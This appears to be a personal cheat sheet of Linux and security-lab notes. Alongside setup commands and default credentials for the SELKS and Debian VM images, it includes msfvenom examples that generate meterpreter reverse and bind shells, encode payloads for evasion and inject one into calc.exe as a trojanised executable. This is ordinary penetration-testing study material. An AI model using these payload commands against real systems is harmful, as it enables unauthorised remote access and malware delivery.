#Linux commands

#Basic commands
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install virtualbox-guest-dkms
sudo apt-get install virtualbox-guest-x11

#Add user rights to shared folder
sudo adduser %username% vboxsf

#Run python scripts
!/usr/bin/env python *.py
chmod 0755 *.py

#Forensic and analytics books
Forensics and Incident Response by Gerard Johansen
Network Intrusion Analysis by Steven Bolt, Joe Fichera

#SELKS
Usage and logon credentials (OS and web management user)
user: selks-user
password: selks-user (password in Live mode is live)
The default root password is StamusNetworks

#Debian credentials
Username: osboxes
Password: osboxes.org
Root Account Password: osboxes.org

#Debian repos
deb http://httpredir.debian.org/debian jessie main contrib
deb-src http://httpredir.debian.org/debian jessie main contrib

deb http://httpredir.debian.org/debian jessie-updates main contrib
deb-src http://httpredir.debian.org/debian jessie-updates main contrib

deb http://security.debian.org/ jessie/updates main contrib
deb-src http://security.debian.org/ jessie/updates main contrib 

#Basic Msfvenom Usage
//If you have never used msfvenom, the first thing you should do is read the help menu, and memorize some of these flags:
    -p, --payload    <payload>       Payload to use. Specify a '-' or stdin to use custom payloads  
    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all  
    -n, --nopsled    <length>        Prepend a nopsled of [length] size on to the payload  
    -f, --format     <format>        Output format (use --help-formats for a list)  
    -e, --encoder    [encoder]       The encoder to use  
    -a, --arch       <architecture>  The architecture to use  
        --platform   <platform>      The platform of the payload  
    -s, --space      <length>        The maximum size of the resulting payload  
    -b, --bad-chars  <list>          The list of characters to avoid example: '\x00\xff'  
    -i, --iterations <count>         The number of times to encode the payload  
    -c, --add-code   <path>          Specify an additional win32 shellcode file to include  
    -x, --template   <path>          Specify a custom executable file to use as a template  
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread  
        --payload-options            List the payload's standard options  
    -o, --out   <path>               Save the payload  
    -v, --var-name <name>            Specify a custom variable name to use for certain output formats  
    -h, --help                       Show this message  
        --help-formats               List available formats  
Example 1: If you wish to list all the payloads available, you can do the following (also the same for listing encoders, nops, or all):

./msfvenom -l payloads  
Example 2: Generating a windows/meterpreter/reverse_tcp:

./msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe  
Example 3: To generate a payload that avoids certain bad characters:

./msfvenom -p windows/meterpreter/bind_tcp -b '\x00'  
Example 4: To generate a payload with a specific encoder, and then encode 3 times:

./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3  
Example 5: Inject a payload to calc.exe, and save it as new.exe

./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe  

#Work with Metasploit DB
root@kali:~# systemctl start postgresql
root@kali:~# msfdb init
msf > db_status 
msf > workspace -a lab4 / msf > workspace -d lab4
msf >  db_import /root/msfu/nmapScan 
